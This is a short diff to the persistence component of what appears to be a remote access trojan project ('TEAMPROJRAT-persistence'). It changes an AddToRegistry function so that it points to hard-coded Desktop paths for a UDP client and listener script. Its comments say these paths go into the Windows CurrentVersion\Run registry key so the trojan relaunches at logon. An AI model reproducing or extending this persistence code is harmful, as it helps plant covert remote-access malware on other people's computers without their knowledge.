@@ -11,15 +11,15 @@ def AddToRegistry():
     # so if it was executed from desktop, 
     # then __file__ will be  
     # c:\users\current_user\desktop 
-    pth = os.path.dirname(os.path.realpath(__file__))
+    #pth = os.path.dirname(os.path.realpath(__file__))
       
     # name of the python file with extension 
-    s_name="/UDP_Connection/client.py"
-    s_name2= "/UDP_Connection/clientlistener.py"     
+    s_name="%homepath%\\Desktop\\TEAMPROJRAT-persistence\\persistence\\UDP_Connection\\client.py"
+    s_name2= "%homepath%\\Desktop\\TEAMPROJRAT-persistence\\persistence\\UDP_Connection\\clientlistener.py"     
       
     # joins the file name to end of path address 
-    address=os.path.join(pth,s_name)  
-    address2 = os.path.join(pth, s_name2)
+    address=os.path.join(s_name)  
+    address2 = os.path.join(s_name2)
 
     # key we want to change is HKEY_CURRENT_USER  
     # key value is Software\Microsoft\Windows\CurrentVersion\Run 
